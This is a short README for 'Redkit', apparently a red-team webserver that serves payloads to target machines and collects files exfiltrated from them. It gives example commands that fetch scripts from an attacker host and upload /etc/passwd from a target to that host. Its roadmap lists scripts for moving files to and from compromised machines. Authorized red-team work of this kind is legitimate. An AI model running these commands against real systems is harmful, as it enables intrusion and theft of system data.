# Redkit
A red team's toolkit webserver. Quickly spin up a webserver that can deliver your payloads curated to target architecture, and easily exfiltrate data over https.

## Current Features

Creates a webserver in the current directory that serves files out of `bin/`. Simply `curl http://attacker.lan:8080/bin/yourscripts.sh`.

Build an image of your target's filesystem by sending POST request multipart forms.
Example:
```
curl -F "/etc/passwd=@/etc/passwd" http://attacker.lan:8080/chroot
```
The result will be placed in `chroot/`.


## Roadmap
- bin follows symlinks and serves the actual file
- Add ability to send directory listings to the chroot, with proper file permissions
- Configure default programs linked to bin based on architecture
- Create basic shell scripts for sending and receiving files from target machine. (include in bin)